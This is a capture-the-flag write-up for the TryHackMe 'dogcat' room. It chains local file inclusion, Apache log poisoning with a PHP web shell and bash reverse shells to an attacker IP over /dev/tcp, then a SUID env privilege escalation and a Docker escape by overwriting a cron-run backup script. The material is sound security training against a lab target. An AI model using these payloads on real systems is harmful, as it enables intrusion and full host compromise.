---
tags:
  - THM
  - Linux
  - Medium
  - LFI
  - Log-Poisoning
  - Docker
  - SUID
  - Cron
---
https://tryhackme.com/room/dogcat/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.65.166.104 dogcat.thm
```
# Scanning
```console
$ nmap -p22,80 -sC -sV dogcat.thm

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:31:19:2a:b1:97:1a:04:4e:2c:36:ac:84:0a:75:87 (RSA)
|   256 21:3d:46:18:93:aa:f9:e7:c9:b5:4c:0f:16:0b:71:e1 (ECDSA)
|_  256 c1:fb:7d:73:2b:57:4a:8b:dc:d7:6f:49:bb:3b:d0:20 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: dogcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
The website displays dogs or cats depending on URL parameter. Ex: `/?view=dog`.

We are currently on `/index.php`.
# Exploitation
## LFI
Visit `/?view=/etc/passwd` and realize the website only allows URLs with dogs or cats:
```text
Sorry, only dogs or cats are allowed. 
```

Visit `/?view=dog/../etc/passwd` and realize that PHP file extensions are appended:
```text
Warning: include(dog/../etc/passwd.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24
  
Warning: include(): Failed opening 'dog/../etc/passwd.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on line 24
```

Visit `/?view=php://filter/convert.base64-encode/resource=dog/../index` to get the base64-encoded source code using wrappers:
```text
PCFET0NUWVBFIEhUTUw+CjxodG1sPgoKPGhlYWQ+CiAgICA8dGl0bGU+ZG9nY2F0PC90aXRsZT4KICAgIDxsaW5rIHJlbD0ic3R5bGVzaGVldCIgdHlwZT0idGV4dC9jc3MiIGhyZWY9Ii9zdHlsZS5jc3MiPgo8L2hlYWQ+Cgo8Ym9keT4KICAgIDxoMT5kb2djYXQ8L2gxPgogICAgPGk+YSBnYWxsZXJ5IG9mIHZhcmlvdXMgZG9ncyBvciBjYXRzPC9pPgoKICAgIDxkaXY+CiAgICAgICAgPGgyPldoYXQgd291bGQgeW91IGxpa2UgdG8gc2VlPzwvaDI+CiAgICAgICAgPGEgaHJlZj0iLz92aWV3PWRvZyI+PGJ1dHRvbiBpZD0iZG9nIj5BIGRvZzwvYnV0dG9uPjwvYT4gPGEgaHJlZj0iLz92aWV3PWNhdCI+PGJ1dHRvbiBpZD0iY2F0Ij5BIGNhdDwvYnV0dG9uPjwvYT48YnI+CiAgICAgICAgPD9waHAKICAgICAgICAgICAgZnVuY3Rpb24gY29udGFpbnNTdHIoJHN0ciwgJHN1YnN0cikgewogICAgICAgICAgICAgICAgcmV0dXJuIHN0cnBvcygkc3RyLCAkc3Vic3RyKSAhPT0gZmFsc2U7CiAgICAgICAgICAgIH0KCSAgICAkZXh0ID0gaXNzZXQoJF9HRVRbImV4dCJdKSA/ICRfR0VUWyJleHQiXSA6ICcucGhwJzsKICAgICAgICAgICAgaWYoaXNzZXQoJF9HRVRbJ3ZpZXcnXSkpIHsKICAgICAgICAgICAgICAgIGlmKGNvbnRhaW5zU3RyKCRfR0VUWyd2aWV3J10sICdkb2cnKSB8fCBjb250YWluc1N0cigkX0dFVFsndmlldyddLCAnY2F0JykpIHsKICAgICAgICAgICAgICAgICAgICBlY2hvICdIZXJlIHlvdSBnbyEnOwogICAgICAgICAgICAgICAgICAgIGluY2x1ZGUgJF9HRVRbJ3ZpZXcnXSAuICRleHQ7CiAgICAgICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgICAgIGVjaG8gJ1NvcnJ5LCBvbmx5IGRvZ3Mgb3IgY2F0cyBhcmUgYWxsb3dlZC4nOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgPz4KICAgIDwvZGl2Pgo8L2JvZHk+Cgo8L2h0bWw+Cg==
```
If we decode it:
```php
<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        <?php
            function containsStr($str, $substr) {
                return strpos($str, $substr) !== false;
            }
	   $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php';
            if(isset($_GET['view'])) {
                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
                    echo 'Here you go!';
                    include $_GET['view'] . $ext;
                } else {
                    echo 'Sorry, only dogs or cats are allowed.';
                }
            }
        ?>
    </div>
</body>

</html>
```
## Log Poisoning
After doing fuzzing at `/?ext=&view=dog/../../../../FUZZ`, found that we can read log files. So, first we poison the user agent:
```console
$ curl http://dogcat.thm/ -A "<?php system(\$_GET['cmd']);?>"
```
Then, we listen for connections:
```console
$ nc -lvnp 4444
```
Finally, we execute the reverse shell command:
```console
$ cmd=$(echo -n 'bash -c "bash -i >& /dev/tcp/192.168.186.238/4444 0>&1"' | urlencode)

$ curl -s "http://dogcat.thm/?ext=&view=dog/../../../../var/log/apache2/access.log&cmd=$cmd"
```
Get the **first** and **second flag**:
```console
$ cat /var/www/html/flag.php

$ cat /var/www/flag2_QMW7JvaY2LvK.txt
```
# Post-Exploitation
## Owning Docker
We are in a Docker container:
```console
$ whoami
www-data

$ hostname -A
dfa8366c09ab
```
The binary `/usr/bin/env` has **SUID permissions**:
```console
$ find / -perm -4000 2>/dev/null

/bin/mount
/bin/su
/bin/umount
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/env
/usr/bin/gpasswd
/usr/bin/sudo
```
Become **root** and get the **third flag**:
```console
$ /usr/bin/env /bin/bash -p

# cat /root/flag3.txt
```
## Escaping Docker
There is a shared backups folder with the **real machine**:
```console
# mount | grep ext4
/dev/nvme1n1p2 on /opt/backups type ext4 (rw,relatime,data=ordered)
/dev/nvme1n1p2 on /etc/resolv.conf type ext4 (rw,relatime,data=ordered)
/dev/nvme1n1p2 on /etc/hostname type ext4 (rw,relatime,data=ordered)
/dev/nvme1n1p2 on /etc/hosts type ext4 (rw,relatime,data=ordered)
/dev/nvme1n1p2 on /var/www/html type ext4 (rw,relatime,data=ordered)

# findmnt /opt/backups
TARGET       SOURCE                                 FSTYPE OPTIONS
/opt/backups /dev/nvme1n1p2[/root/container/backup] ext4   rw,relatime,data=ordered
```
We find a **script** and its scheduled backup:
```console
# ls /opt/backups/
backup.sh  backup.tar

# cat /opt/backups/backup.sh
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
```
We do not have cron jobs inside the container, so it is probably being executed by someone on the **real machine**:
```console
# cat /etc/crontab

cat: /etc/crontab: No such file or directory
```
Modify the **script** to get a reverse shell:
```console
$ echo -e '#!/bin/bash\nbash -i >& /dev/tcp/192.168.186.238/1234 0>&1' > /opt/backups/backup.sh
```
Wait for connections and get the **fourth flag**:
```console
$ nc -lvnp 1234

# cat /root/flag4.txt
```